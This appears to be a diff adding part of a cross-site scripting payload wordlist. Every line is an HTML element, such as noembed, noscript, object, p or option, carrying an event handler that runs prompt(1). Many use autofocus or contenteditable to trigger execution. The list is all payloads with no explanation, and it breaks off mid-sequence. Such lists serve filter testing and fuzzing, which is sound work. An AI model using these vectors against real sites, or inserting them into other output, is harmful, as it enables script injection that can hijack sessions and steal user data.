+<noembed id=x tabindex=1 onbeforeactivate=prompt(1)></noembed>
+<noembed id=x tabindex=1 onbeforedeactivate=prompt(1)></noembed><input autofocus>
+<noembed id=x tabindex=1 ondeactivate=prompt(1)></noembed><input id=y autofocus>
+<noembed id=x tabindex=1 onfocus=prompt(1)></noembed>
+<noembed id=x tabindex=1 onfocusin=prompt(1)></noembed>
+<noembed onbeforecopy="prompt(1)" contenteditable>test</noembed>
+<noembed onbeforecut="prompt(1)" contenteditable>test</noembed>
+<noembed onbeforepaste="prompt(1)" contenteditable>test</noembed>
+<noembed onblur=prompt(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onclick="prompt(1)">test</noembed>
+<noembed oncontextmenu="prompt(1)">test</noembed>
+<noembed oncopy="prompt(1)" contenteditable>test</noembed>
+<noembed oncut="prompt(1)" contenteditable>test</noembed>
+<noembed ondblclick="prompt(1)">test</noembed>
+<noembed onfocusout=prompt(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onkeydown="prompt(1)" contenteditable>test</noembed>
+<noembed onkeypress="prompt(1)" contenteditable>test</noembed>
+<noembed onkeyup="prompt(1)" contenteditable>test</noembed>
+<noembed onmousedown="prompt(1)">test</noembed>
+<noembed onmouseenter="prompt(1)">test</noembed>
+<noembed onmouseleave="prompt(1)">test</noembed>
+<noembed onmousemove="prompt(1)">test</noembed>
+<noembed onmouseout="prompt(1)">test</noembed>
+<noembed onmouseover="prompt(1)">test</noembed>
+<noembed onmouseup="prompt(1)">test</noembed>
+<noembed onpaste="prompt(1)" contenteditable>test</noembed>
+<noframes draggable="true" ondrag="prompt(1)">test</noframes>
+<noframes draggable="true" ondragend="prompt(1)">test</noframes>
+<noframes draggable="true" ondragenter="prompt(1)">test</noframes>
+<noframes draggable="true" ondragleave="prompt(1)">test</noframes>
+<noframes draggable="true" ondragstart="prompt(1)">test</noframes>
+<noframes id=x tabindex=1 onactivate=prompt(1)></noframes>
+<noframes id=x tabindex=1 onbeforeactivate=prompt(1)></noframes>
+<noframes id=x tabindex=1 onbeforedeactivate=prompt(1)></noframes><input autofocus>
+<noframes id=x tabindex=1 ondeactivate=prompt(1)></noframes><input id=y autofocus>
+<noframes id=x tabindex=1 onfocus=prompt(1)></noframes>
+<noframes id=x tabindex=1 onfocusin=prompt(1)></noframes>
+<noframes onbeforecopy="prompt(1)" contenteditable>test</noframes>
+<noframes onbeforecut="prompt(1)" contenteditable>test</noframes>
+<noframes onbeforepaste="prompt(1)" contenteditable>test</noframes>
+<noframes onblur=prompt(1) tabindex=1 id=x></noframes><input autofocus>
+<noframes onclick="prompt(1)">test</noframes>
+<noframes oncontextmenu="prompt(1)">test</noframes>
+<noframes oncopy="prompt(1)" contenteditable>test</noframes>
+<noframes oncut="prompt(1)" contenteditable>test</noframes>
+<noframes ondblclick="prompt(1)">test</noframes>
+<noframes onfocusout=prompt(1) tabindex=1 id=x></noframes><input autofocus>
+<noframes onkeydown="prompt(1)" contenteditable>test</noframes>
+<noframes onkeypress="prompt(1)" contenteditable>test</noframes>
+<noframes onkeyup="prompt(1)" contenteditable>test</noframes>
+<noframes onmousedown="prompt(1)">test</noframes>
+<noframes onmouseenter="prompt(1)">test</noframes>
+<noframes onmouseleave="prompt(1)">test</noframes>
+<noframes onmousemove="prompt(1)">test</noframes>
+<noframes onmouseout="prompt(1)">test</noframes>
+<noframes onmouseover="prompt(1)">test</noframes>
+<noframes onmouseup="prompt(1)">test</noframes>
+<noframes onpaste="prompt(1)" contenteditable>test</noframes>
+<noscript draggable="true" ondrag="prompt(1)">test</noscript>
+<noscript draggable="true" ondragend="prompt(1)">test</noscript>
+<noscript draggable="true" ondragenter="prompt(1)">test</noscript>
+<noscript draggable="true" ondragleave="prompt(1)">test</noscript>
+<noscript draggable="true" ondragstart="prompt(1)">test</noscript>
+<noscript id=x tabindex=1 onactivate=prompt(1)></noscript>
+<noscript id=x tabindex=1 onbeforeactivate=prompt(1)></noscript>
+<noscript id=x tabindex=1 onbeforedeactivate=prompt(1)></noscript><input autofocus>
+<noscript id=x tabindex=1 ondeactivate=prompt(1)></noscript><input id=y autofocus>
+<noscript id=x tabindex=1 onfocus=prompt(1)></noscript>
+<noscript id=x tabindex=1 onfocusin=prompt(1)></noscript>
+<noscript onbeforecopy="prompt(1)" contenteditable>test</noscript>
+<noscript onbeforecut="prompt(1)" contenteditable>test</noscript>
+<noscript onbeforepaste="prompt(1)" contenteditable>test</noscript>
+<noscript onblur=prompt(1) tabindex=1 id=x></noscript><input autofocus>
+<noscript onclick="prompt(1)">test</noscript>
+<noscript oncontextmenu="prompt(1)">test</noscript>
+<noscript oncopy="prompt(1)" contenteditable>test</noscript>
+<noscript oncut="prompt(1)" contenteditable>test</noscript>
+<noscript ondblclick="prompt(1)">test</noscript>
+<noscript onfocusout=prompt(1) tabindex=1 id=x></noscript><input autofocus>
+<noscript onkeydown="prompt(1)" contenteditable>test</noscript>
+<noscript onkeypress="prompt(1)" contenteditable>test</noscript>
+<noscript onkeyup="prompt(1)" contenteditable>test</noscript>
+<noscript onmousedown="prompt(1)">test</noscript>
+<noscript onmouseenter="prompt(1)">test</noscript>
+<noscript onmouseleave="prompt(1)">test</noscript>
+<noscript onmousemove="prompt(1)">test</noscript>
+<noscript onmouseout="prompt(1)">test</noscript>
+<noscript onmouseover="prompt(1)">test</noscript>
+<noscript onmouseup="prompt(1)">test</noscript>
+<noscript onpaste="prompt(1)" contenteditable>test</noscript>
+<object data=/ onload=prompt(1)>
+<object data=/ onreadystatechange=prompt(1)>
+<object draggable="true" ondrag="prompt(1)">test</object>
+<object draggable="true" ondragend="prompt(1)">test</object>
+<object draggable="true" ondragenter="prompt(1)">test</object>
+<object draggable="true" ondragleave="prompt(1)">test</object>
+<object draggable="true" ondragstart="prompt(1)">test</object>
+<object id=x onfocus=prompt(1) type=text/html>
+<object id=x onfocusin=prompt(1) type=text/html>
+<object id=x tabindex=1 onactivate=prompt(1)></object>
+<object id=x tabindex=1 onbeforeactivate=prompt(1)></object>
+<object id=x tabindex=1 onbeforedeactivate=prompt(1)></object><input autofocus>
+<object id=x tabindex=1 ondeactivate=prompt(1)></object><input id=y autofocus>
+<object onbeforecopy="prompt(1)" contenteditable>test</object>
+<object onbeforecut="prompt(1)" contenteditable>test</object>
+<object onbeforepaste="prompt(1)" contenteditable>test</object>
+<object onblur=prompt(1) tabindex=1 id=x></object><input autofocus>
+<object onclick="prompt(1)">test</object>
+<object oncontextmenu="prompt(1)">test</object>
+<object oncopy="prompt(1)" contenteditable>test</object>
+<object oncut="prompt(1)" contenteditable>test</object>
+<object ondblclick="prompt(1)">test</object>
+<object onerror=prompt(1) data=1 type=image/gif>
+<object onfocusout=prompt(1) tabindex=1 id=x></object><input autofocus>
+<object onkeydown="prompt(1)" contenteditable>test</object>
+<object onkeypress="prompt(1)" contenteditable>test</object>
+<object onkeyup="prompt(1)" contenteditable>test</object>
+<object onmousedown="prompt(1)">test</object>
+<object onmouseenter="prompt(1)">test</object>
+<object onmouseleave="prompt(1)">test</object>
+<object onmousemove="prompt(1)">test</object>
+<object onmouseout="prompt(1)">test</object>
+<object onmouseover="prompt(1)">test</object>
+<object onmouseup="prompt(1)">test</object>
+<object onpaste="prompt(1)" contenteditable>test</object>
+<ol draggable="true" ondrag="prompt(1)">test</ol>
+<ol draggable="true" ondragend="prompt(1)">test</ol>
+<ol draggable="true" ondragenter="prompt(1)">test</ol>
+<ol draggable="true" ondragleave="prompt(1)">test</ol>
+<ol draggable="true" ondragstart="prompt(1)">test</ol>
+<ol id=x tabindex=1 onactivate=prompt(1)></ol>
+<ol id=x tabindex=1 onbeforeactivate=prompt(1)></ol>
+<ol id=x tabindex=1 onbeforedeactivate=prompt(1)></ol><input autofocus>
+<ol id=x tabindex=1 ondeactivate=prompt(1)></ol><input id=y autofocus>
+<ol id=x tabindex=1 onfocus=prompt(1)></ol>
+<ol id=x tabindex=1 onfocusin=prompt(1)></ol>
+<ol onbeforecopy="prompt(1)" contenteditable>test</ol>
+<ol onbeforecut="prompt(1)" contenteditable>test</ol>
+<ol onbeforepaste="prompt(1)" contenteditable>test</ol>
+<ol onblur=prompt(1) tabindex=1 id=x></ol><input autofocus>
+<ol onclick="prompt(1)">test</ol>
+<ol oncontextmenu="prompt(1)">test</ol>
+<ol oncopy="prompt(1)" contenteditable>test</ol>
+<ol oncut="prompt(1)" contenteditable>test</ol>
+<ol ondblclick="prompt(1)">test</ol>
+<ol onfocusout=prompt(1) tabindex=1 id=x></ol><input autofocus>
+<ol onkeydown="prompt(1)" contenteditable>test</ol>
+<ol onkeypress="prompt(1)" contenteditable>test</ol>
+<ol onkeyup="prompt(1)" contenteditable>test</ol>
+<ol onmousedown="prompt(1)">test</ol>
+<ol onmouseenter="prompt(1)">test</ol>
+<ol onmouseleave="prompt(1)">test</ol>
+<ol onmousemove="prompt(1)">test</ol>
+<ol onmouseout="prompt(1)">test</ol>
+<ol onmouseover="prompt(1)">test</ol>
+<ol onmouseup="prompt(1)">test</ol>
+<ol onpaste="prompt(1)" contenteditable>test</ol>
+<optgroup draggable="true" ondrag="prompt(1)">test</optgroup>
+<optgroup draggable="true" ondragend="prompt(1)">test</optgroup>
+<optgroup draggable="true" ondragenter="prompt(1)">test</optgroup>
+<optgroup draggable="true" ondragleave="prompt(1)">test</optgroup>
+<optgroup draggable="true" ondragstart="prompt(1)">test</optgroup>
+<optgroup id=x tabindex=1 onactivate=prompt(1)></optgroup>
+<optgroup id=x tabindex=1 onbeforeactivate=prompt(1)></optgroup>
+<optgroup id=x tabindex=1 onbeforedeactivate=prompt(1)></optgroup><input autofocus>
+<optgroup id=x tabindex=1 ondeactivate=prompt(1)></optgroup><input id=y autofocus>
+<optgroup id=x tabindex=1 onfocus=prompt(1)></optgroup>
+<optgroup id=x tabindex=1 onfocusin=prompt(1)></optgroup>
+<optgroup onbeforecopy="prompt(1)" contenteditable>test</optgroup>
+<optgroup onbeforecut="prompt(1)" contenteditable>test</optgroup>
+<optgroup onbeforepaste="prompt(1)" contenteditable>test</optgroup>
+<optgroup onblur=prompt(1) tabindex=1 id=x></optgroup><input autofocus>
+<optgroup onclick="prompt(1)">test</optgroup>
+<optgroup oncontextmenu="prompt(1)">test</optgroup>
+<optgroup oncopy="prompt(1)" contenteditable>test</optgroup>
+<optgroup oncut="prompt(1)" contenteditable>test</optgroup>
+<optgroup ondblclick="prompt(1)">test</optgroup>
+<optgroup onfocusout=prompt(1) tabindex=1 id=x></optgroup><input autofocus>
+<optgroup onkeydown="prompt(1)" contenteditable>test</optgroup>
+<optgroup onkeypress="prompt(1)" contenteditable>test</optgroup>
+<optgroup onkeyup="prompt(1)" contenteditable>test</optgroup>
+<optgroup onmousedown="prompt(1)">test</optgroup>
+<optgroup onmouseenter="prompt(1)">test</optgroup>
+<optgroup onmouseleave="prompt(1)">test</optgroup>
+<optgroup onmousemove="prompt(1)">test</optgroup>
+<optgroup onmouseout="prompt(1)">test</optgroup>
+<optgroup onmouseover="prompt(1)">test</optgroup>
+<optgroup onmouseup="prompt(1)">test</optgroup>
+<optgroup onpaste="prompt(1)" contenteditable>test</optgroup>
+<option draggable="true" ondrag="prompt(1)">test</option>
+<option draggable="true" ondragend="prompt(1)">test</option>
+<option draggable="true" ondragenter="prompt(1)">test</option>
+<option draggable="true" ondragleave="prompt(1)">test</option>
+<option draggable="true" ondragstart="prompt(1)">test</option>
+<option id=x tabindex=1 onactivate=prompt(1)></option>
+<option id=x tabindex=1 onbeforeactivate=prompt(1)></option>
+<option id=x tabindex=1 onbeforedeactivate=prompt(1)></option><input autofocus>
+<option id=x tabindex=1 ondeactivate=prompt(1)></option><input id=y autofocus>
+<option id=x tabindex=1 onfocus=prompt(1)></option>
+<option id=x tabindex=1 onfocusin=prompt(1)></option>
+<option onbeforecopy="prompt(1)" contenteditable>test</option>
+<option onbeforecut="prompt(1)" contenteditable>test</option>
+<option onbeforepaste="prompt(1)" contenteditable>test</option>
+<option onblur=prompt(1) tabindex=1 id=x></option><input autofocus>
+<option onclick="prompt(1)">test</option>
+<option oncontextmenu="prompt(1)">test</option>
+<option oncopy="prompt(1)" contenteditable>test</option>
+<option oncut="prompt(1)" contenteditable>test</option>
+<option ondblclick="prompt(1)">test</option>
+<option onfocusout=prompt(1) tabindex=1 id=x></option><input autofocus>
+<option onkeydown="prompt(1)" contenteditable>test</option>
+<option onkeypress="prompt(1)" contenteditable>test</option>
+<option onkeyup="prompt(1)" contenteditable>test</option>
+<option onmousedown="prompt(1)">test</option>
+<option onmouseenter="prompt(1)">test</option>
+<option onmouseleave="prompt(1)">test</option>
+<option onmousemove="prompt(1)">test</option>
+<option onmouseout="prompt(1)">test</option>
+<option onmouseover="prompt(1)">test</option>
+<option onmouseup="prompt(1)">test</option>
+<option onpaste="prompt(1)" contenteditable>test</option>
+<output draggable="true" ondrag="prompt(1)">test</output>
+<output draggable="true" ondragend="prompt(1)">test</output>
+<output draggable="true" ondragenter="prompt(1)">test</output>
+<output draggable="true" ondragleave="prompt(1)">test</output>
+<output draggable="true" ondragstart="prompt(1)">test</output>
+<output id=x tabindex=1 onactivate=prompt(1)></output>
+<output id=x tabindex=1 onbeforeactivate=prompt(1)></output>
+<output id=x tabindex=1 onbeforedeactivate=prompt(1)></output><input autofocus>
+<output id=x tabindex=1 ondeactivate=prompt(1)></output><input id=y autofocus>
+<output id=x tabindex=1 onfocus=prompt(1)></output>
+<output id=x tabindex=1 onfocusin=prompt(1)></output>
+<output onbeforecopy="prompt(1)" contenteditable>test</output>
+<output onbeforecut="prompt(1)" contenteditable>test</output>
+<output onbeforepaste="prompt(1)" contenteditable>test</output>
+<output onblur=prompt(1) tabindex=1 id=x></output><input autofocus>
+<output onclick="prompt(1)">test</output>
+<output oncontextmenu="prompt(1)">test</output>
+<output oncopy="prompt(1)" contenteditable>test</output>
+<output oncut="prompt(1)" contenteditable>test</output>
+<output ondblclick="prompt(1)">test</output>
+<output onfocusout=prompt(1) tabindex=1 id=x></output><input autofocus>
+<output onkeydown="prompt(1)" contenteditable>test</output>
+<output onkeypress="prompt(1)" contenteditable>test</output>
+<output onkeyup="prompt(1)" contenteditable>test</output>
+<output onmousedown="prompt(1)">test</output>
+<output onmouseenter="prompt(1)">test</output>
+<output onmouseleave="prompt(1)">test</output>
+<output onmousemove="prompt(1)">test</output>
+<output onmouseout="prompt(1)">test</output>
+<output onmouseover="prompt(1)">test</output>
+<output onmouseup="prompt(1)">test</output>
+<output onpaste="prompt(1)" contenteditable>test</output>
+<p draggable="true" ondrag="prompt(1)">test</p>
+<p draggable="true" ondragend="prompt(1)">test</p>
+<p draggable="true" ondragenter="prompt(1)">test</p>
+<p draggable="true" ondragleave="prompt(1)">test</p>
+<p draggable="true" ondragstart="prompt(1)">test</p>
+<p id=x tabindex=1 onactivate=prompt(1)></p>
+<p id=x tabindex=1 onbeforeactivate=prompt(1)></p>
+<p id=x tabindex=1 onbeforedeactivate=prompt(1)></p><input autofocus>
+<p id=x tabindex=1 ondeactivate=prompt(1)></p><input id=y autofocus>
+<p id=x tabindex=1 onfocus=prompt(1)></p>
+<p id=x tabindex=1 onfocusin=prompt(1)></p>
+<p onbeforecopy="prompt(1)" contenteditable>test</p>
+<p onbeforecut="prompt(1)" contenteditable>test</p>
+<p onbeforepaste="prompt(1)" contenteditable>test</p>
+<p onblur=prompt(1) tabindex=1 id=x></p><input autofocus>
+<p onclick="prompt(1)">test</p>
+<p oncontextmenu="prompt(1)">test</p>
+<p oncopy="prompt(1)" contenteditable>test</p>
+<p oncut="prompt(1)" contenteditable>test</p>
+<p ondblclick="prompt(1)">test</p>
+<p onfocusout=prompt(1) tabindex=1 id=x></p><input autofocus>
+<p onkeydown="prompt(1)" contenteditable>test</p>
+<p onkeypress="prompt(1)" contenteditable>test</p>
+<p onkeyup="prompt(1)" contenteditable>test</p>
+<p onmousedown="prompt(1)">test</p>
+<p onmouseenter="prompt(1)">test</p>
+<p onmouseleave="prompt(1)">test</p>
+<p onmousemove="prompt(1)">test</p>
+<p onmouseout="prompt(1)">test</p>
+<p onmouseover="prompt(1)">test</p>
+<p onmouseup="prompt(1)">test</p>
+<p onpaste="prompt(1)" contenteditable>test</p>
+<param draggable="true" ondrag="prompt(1)">test</param>
+<param draggable="true" ondragend="prompt(1)">test</param>
+<param draggable="true" ondragenter="prompt(1)">test</param>
+<param draggable="true" ondragleave="prompt(1)">test</param>
+<param draggable="true" ondragstart="prompt(1)">test</param>
+<param id=x tabindex=1 onactivate=prompt(1)></param>
+<param id=x tabindex=1 onbeforeactivate=prompt(1)></param>
+<param id=x tabindex=1 onbeforedeactivate=prompt(1)></param><input autofocus>
+<param id=x tabindex=1 ondeactivate=prompt(1)></param><input id=y autofocus>
+<param id=x tabindex=1 onfocus=prompt(1)></param>
+<param id=x tabindex=1 onfocusin=prompt(1)></param>
+<param onbeforecopy="prompt(1)" contenteditable>test</param>
+<param onbeforecut="prompt(1)" contenteditable>test</param>
+<param onbeforepaste="prompt(1)" contenteditable>test</param>
+<param onblur=prompt(1) tabindex=1 id=x></param><input autofocus>
+<param onclick="prompt(1)">test</param>
+<param oncontextmenu="prompt(1)">test</param>
+<param oncopy="prompt(1)" contenteditable>test</param>
+<param oncut="prompt(1)" contenteditable>test</param>
+<param ondblclick="prompt(1)">test</param>
+<param onfocusout=prompt(1) tabindex=1 id=x></param><input autofocus>
+<param onkeydown="prompt(1)" contenteditable>test</param>
+<param onkeypress="prompt(1)" contenteditable>test</param>
+<param onkeyup="prompt(1)" contenteditable>test</param>
+<param onmousedown="prompt(1)">test</param>
+<param onmouseenter="prompt(1)">test</param>
+<param onmouseleave="prompt(1)">test</param>
+<param onmousemove="prompt(1)">test</param>
+<param onmouseout="prompt(1)">test</param>
+<param onmouseover="prompt(1)">test</param>
+<param onmouseup="prompt(1)">test</param>
+<param onpaste="prompt(1)" contenteditable>test</param>
+<picture draggable="true" ondrag="prompt(1)">test</picture>
+<picture draggable="true" ondragend="prompt(1)">test</picture>
+<picture draggable="true" ondragenter="prompt(1)">test</picture>
+<picture draggable="true" ondragleave="prompt(1)">test</picture>
+<picture draggable="true" ondragstart="prompt(1)">test</picture>
+<picture id=x tabindex=1 onactivate=prompt(1)></picture>
+<picture id=x tabindex=1 onbeforeactivate=prompt(1)></picture>
+<picture id=x tabindex=1 onbeforedeactivate=prompt(1)></picture><input autofocus>
+<picture id=x tabindex=1 ondeactivate=prompt(1)></picture><input id=y autofocus>
+<picture id=x tabindex=1 onfocus=prompt(1)></picture>
+<picture id=x tabindex=1 onfocusin=prompt(1)></picture>
+<picture onbeforecopy="prompt(1)" contenteditable>test</picture>
+<picture onbeforecut="prompt(1)" contenteditable>test</picture>
+<picture onbeforepaste="prompt(1)" contenteditable>test</picture>
+<picture onblur=prompt(1) tabindex=1 id=x></picture><input autofocus>
+<picture onclick="prompt(1)">test</picture>
+<picture oncontextmenu="prompt(1)">test</picture>
+<picture oncopy="prompt(1)" contenteditable>test</picture>
+<picture oncut="prompt(1)" contenteditable>test</picture>
+<picture ondblclick="prompt(1)">test</picture>
+<picture onfocusout=prompt(1) tabindex=1 id=x></picture><input autofocus>
+<picture onkeydown="prompt(1)" contenteditable>test</picture>
+<picture onkeypress="prompt(1)" contenteditable>test</picture>
+<picture onkeyup="prompt(1)" contenteditable>test</picture>
+<picture onmousedown="prompt(1)">test</picture>
+<picture onmouseenter="prompt(1)">test</picture>
+<picture onmouseleave="prompt(1)">test</picture>
+<picture onmousemove="prompt(1)">test</picture>
+<picture onmouseout="prompt(1)">test</picture>
+<picture onmouseover="prompt(1)">test</picture>
+<picture onmouseup="prompt(1)">test</picture>
+<picture onpaste="prompt(1)" contenteditable>test</picture>
+<picture><source srcset="validimage.png"><image onload=prompt(1)></picture>
+<picture><source srcset="validimage.png"><image onloadend=prompt(1)></picture>
+<picture><source srcset="validimage.png"><image onloadstart=prompt(1)></picture>
+<picture><source srcset="validimage.png"><img onload=prompt(1)></picture>
+<picture><source srcset="validimage.png"><img onloadend=prompt(1)></picture>
+<picture><source srcset="validimage.png"><img onloadstart=prompt(1)></picture>
+<plaintext draggable="true" ondrag="prompt(1)">test</plaintext>
+<plaintext draggable="true" ondragend="prompt(1)">test</plaintext>
+<plaintext draggable="true" ondragenter="prompt(1)">test</plaintext>
+<plaintext draggable="true" ondragleave="prompt(1)">test</plaintext>
+<plaintext draggable="true" ondragstart="prompt(1)">test</plaintext>
+<plaintext id=x tabindex=1 onactivate=prompt(1)></plaintext>
+<plaintext id=x tabindex=1 onbeforeactivate=prompt(1)></plaintext>
+<plaintext id=x tabindex=1 onbeforedeactivate=prompt(1)></plaintext><input autofocus>
+<plaintext id=x tabindex=1 ondeactivate=prompt(1)></plaintext><input id=y autofocus>
+<plaintext id=x tabindex=1 onfocus=prompt(1)></plaintext>
+<plaintext id=x tabindex=1 onfocusin=prompt(1)></plaintext>
+<plaintext onbeforecopy="prompt(1)" contenteditable>test</plaintext>
+<plaintext onbeforecut="prompt(1)" contenteditable>test</plaintext>
+<plaintext onbeforepaste="prompt(1)" contenteditable>test</plaintext>
+<plaintext onblur=prompt(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onclick="prompt(1)">test</plaintext>
+<plaintext oncontextmenu="prompt(1)">test</plaintext>
+<plaintext oncopy="prompt(1)" contenteditable>test</plaintext>
+<plaintext oncut="prompt(1)" contenteditable>test</plaintext>
+<plaintext ondblclick="prompt(1)">test</plaintext>
+<plaintext onfocusout=prompt(1) tabindex=1 id=x></plaintext><input autofocus>
+<plaintext onkeydown="prompt(1)" contenteditable>test</plaintext>
+<plaintext onkeypress="prompt(1)" contenteditable>test</plaintext>
+<plaintext onkeyup="prompt(1)" contenteditable>test</plaintext>
+<plaintext onmousedown="prompt(1)">test</plaintext>
+<plaintext onmouseenter="prompt(1)">test</plaintext>
+<plaintext onmouseleave="prompt(1)">test</plaintext>
+<plaintext onmousemove="prompt(1)">test</plaintext>
+<plaintext onmouseout="prompt(1)">test</plaintext>
+<plaintext onmouseover="prompt(1)">test</plaintext>
+<plaintext onmouseup="prompt(1)">test</plaintext>
+<plaintext onpaste="prompt(1)" contenteditable>test</plaintext>
+<pre draggable="true" ondrag="prompt(1)">test</pre>
+<pre draggable="true" ondragend="prompt(1)">test</pre>
+<pre draggable="true" ondragenter="prompt(1)">test</pre>
+<pre draggable="true" ondragleave="prompt(1)">test</pre>
+<pre draggable="true" ondragstart="prompt(1)">test</pre>
+<pre id=x tabindex=1 onactivate=prompt(1)></pre>
+<pre id=x tabindex=1 onbeforeactivate=prompt(1)></pre>
+<pre id=x tabindex=1 onbeforedeactivate=prompt(1)></pre><input autofocus>
+<pre id=x tabindex=1 ondeactivate=prompt(1)></pre><input id=y autofocus>
+<pre id=x tabindex=1 onfocus=prompt(1)></pre>
+<pre id=x tabindex=1 onfocusin=prompt(1)></pre>
+<pre onbeforecopy="prompt(1)" contenteditable>test</pre>
+<pre onbeforecut="prompt(1)" contenteditable>test</pre>
+<pre onbeforepaste="prompt(1)" contenteditable>test</pre>
+<pre onblur=prompt(1) tabindex=1 id=x></pre><input autofocus>
+<pre onclick="prompt(1)">test</pre>
+<pre oncontextmenu="prompt(1)">test</pre>
+<pre oncopy="prompt(1)" contenteditable>test</pre>
+<pre oncut="prompt(1)" contenteditable>test</pre>
+<pre ondblclick="prompt(1)">test</pre>
+<pre onfocusout=prompt(1) tabindex=1 id=x></pre><input autofocus>
+<pre onkeydown="prompt(1)" contenteditable>test</pre>
+<pre onkeypress="prompt(1)" contenteditable>test</pre>
+<pre onkeyup="prompt(1)" contenteditable>test</pre>
+<pre onmousedown="prompt(1)">test</pre>
+<pre onmouseenter="prompt(1)">test</pre>
+<pre onmouseleave="prompt(1)">test</pre>
+<pre onmousemove="prompt(1)">test</pre>
+<pre onmouseout="prompt(1)">test</pre>
+<pre onmouseover="prompt(1)">test</pre>
+<pre onmouseup="prompt(1)">test</pre>
+<pre onpaste="prompt(1)" contenteditable>test</pre>
+<progress draggable="true" ondrag="prompt(1)">test</progress>
+<progress draggable="true" ondragend="prompt(1)">test</progress>
+<progress draggable="true" ondragenter="prompt(1)">test</progress>
+<progress draggable="true" ondragleave="prompt(1)">test</progress>
+<progress draggable="true" ondragstart="prompt(1)">test</progress>
+<progress id=x tabindex=1 onactivate=prompt(1)></progress>
+<progress id=x tabindex=1 onbeforeactivate=prompt(1)></progress>
+<progress id=x tabindex=1 onbeforedeactivate=prompt(1)></progress><input autofocus>
+<progress id=x tabindex=1 ondeactivate=prompt(1)></progress><input id=y autofocus>
+<progress id=x tabindex=1 onfocus=prompt(1)></progress>
+<progress id=x tabindex=1 onfocusin=prompt(1)></progress>
+<progress onbeforecopy="prompt(1)" contenteditable>test</progress>
+<progress onbeforecut="prompt(1)" contenteditable>test</progress>
+<progress onbeforepaste="prompt(1)" contenteditable>test</progress>
+<progress onblur=prompt(1) tabindex=1 id=x></progress><input autofocus>
+<progress onclick="prompt(1)">test</progress>
+<progress oncontextmenu="prompt(1)">test</progress>
+<progress oncopy="prompt(1)" contenteditable>test</progress>
+<progress oncut="prompt(1)" contenteditable>test</progress>
+<progress ondblclick="prompt(1)">test</progress>
+<progress onfocusout=prompt(1) tabindex=1 id=x></progress><input autofocus>
+<progress onkeydown="prompt(1)" contenteditable>test</progress>
+<progress onkeypress="prompt(1)" contenteditable>test</progress>
+<progress onkeyup="prompt(1)" contenteditable>test</progress>
+<progress onmousedown="prompt(1)">test</progress>
+<progress onmouseenter="prompt(1)">test</progress>
+<progress onmouseleave="prompt(1)">test</progress>
+<progress onmousemove="prompt(1)">test</progress>
+<progress onmouseout="prompt(1)">test</progress>
+<progress onmouseover="prompt(1)">test</progress>
+<progress onmouseup="prompt(1)">test</progress>
+<progress onpaste="prompt(1)" contenteditable>test</progress>
+<q draggable="true" ondrag="prompt(1)">test</q>
+<q draggable="true" ondragend="prompt(1)">test</q>
+<q draggable="true" ondragenter="prompt(1)">test</q>
+<q draggable="true" ondragleave="prompt(1)">test</q>
+<q draggable="true" ondragstart="prompt(1)">test</q>
+<q id=x tabindex=1 onactivate=prompt(1)></q>
+<q id=x tabindex=1 onbeforeactivate=prompt(1)></q>
+<q id=x tabindex=1 onbeforedeactivate=prompt(1)></q><input autofocus>
+<q id=x tabindex=1 ondeactivate=prompt(1)></q><input id=y autofocus>
+<q id=x tabindex=1 onfocus=prompt(1)></q>
+<q id=x tabindex=1 onfocusin=prompt(1)></q>
+<q onbeforecopy="prompt(1)" contenteditable>test</q>
+<q onbeforecut="prompt(1)" contenteditable>test</q>
+<q onbeforepaste="prompt(1)" contenteditable>test</q>
+<q onblur=prompt(1) tabindex=1 id=x></q><input autofocus>
+<q onclick="prompt(1)">test</q>
+<q oncontextmenu="prompt(1)">test</q>
+<q oncopy="prompt(1)" contenteditable>test</q>
+<q oncut="prompt(1)" contenteditable>test</q>
+<q ondblclick="prompt(1)">test</q>
+<q onfocusout=prompt(1) tabindex=1 id=x></q><input autofocus>
+<q onkeydown="prompt(1)" contenteditable>test</q>
+<q onkeypress="prompt(1)" contenteditable>test</q>
+<q onkeyup="prompt(1)" contenteditable>test</q>
+<q onmousedown="prompt(1)">test</q>
+<q onmouseenter="prompt(1)">test</q>
+<q onmouseleave="prompt(1)">test</q>
+<q onmousemove="prompt(1)">test</q>
+<q onmouseout="prompt(1)">test</q>
+<q onmouseover="prompt(1)">test</q>
+<q onmouseup="prompt(1)">test</q>
+<q onpaste="prompt(1)" contenteditable>test</q>
+<rb draggable="true" ondrag="prompt(1)">test</rb>
+<rb draggable="true" ondragend="prompt(1)">test</rb>
+<rb draggable="true" ondragenter="prompt(1)">test</rb>
+<rb draggable="true" ondragleave="prompt(1)">test</rb>
+<rb draggable="true" ondragstart="prompt(1)">test</rb>
+<rb id=x tabindex=1 onactivate=prompt(1)></rb>
+<rb id=x tabindex=1 onbeforeactivate=prompt(1)></rb>
+<rb id=x tabindex=1 onbeforedeactivate=prompt(1)></rb><input autofocus>
+<rb id=x tabindex=1 ondeactivate=prompt(1)></rb><input id=y autofocus>
+<rb id=x tabindex=1 onfocus=prompt(1)></rb>
+<rb id=x tabindex=1 onfocusin=prompt(1)></rb>
+<rb onbeforecopy="prompt(1)" contenteditable>test</rb>
+<rb onbeforecut="prompt(1)" contenteditable>test</rb>
+<rb onbeforepaste="prompt(1)" contenteditable>test</rb>
+<rb onblur=prompt(1) tabindex=1 id=x></rb><input autofocus>
+<rb onclick="prompt(1)">test</rb>
+<rb oncontextmenu="prompt(1)">test</rb>
+<rb oncopy="prompt(1)" contenteditable>test</rb>
+<rb oncut="prompt(1)" contenteditable>test</rb>
+<rb ondblclick="prompt(1)">test</rb>
+<rb onfocusout=prompt(1) tabindex=1 id=x></rb><input autofocus>
+<rb onkeydown="prompt(1)" contenteditable>test</rb>
+<rb onkeypress="prompt(1)" contenteditable>test</rb>
+<rb onkeyup="prompt(1)" contenteditable>test</rb>
+<rb onmousedown="prompt(1)">test</rb>
+<rb onmouseenter="prompt(1)">test</rb>
+<rb onmouseleave="prompt(1)">test</rb>
+<rb onmousemove="prompt(1)">test</rb>
+<rb onmouseout="prompt(1)">test</rb>
+<rb onmouseover="prompt(1)">test</rb>
+<rb onmouseup="prompt(1)">test</rb>
+<rb onpaste="prompt(1)" contenteditable>test</rb>
+<rp draggable="true" ondrag="prompt(1)">test</rp>
+<rp draggable="true" ondragend="prompt(1)">test</rp>
+<rp draggable="true" ondragenter="prompt(1)">test</rp>
+<rp draggable="true" ondragleave="prompt(1)">test</rp>
+<rp draggable="true" ondragstart="prompt(1)">test</rp>
+<rp id=x tabindex=1 onactivate=prompt(1)></rp>
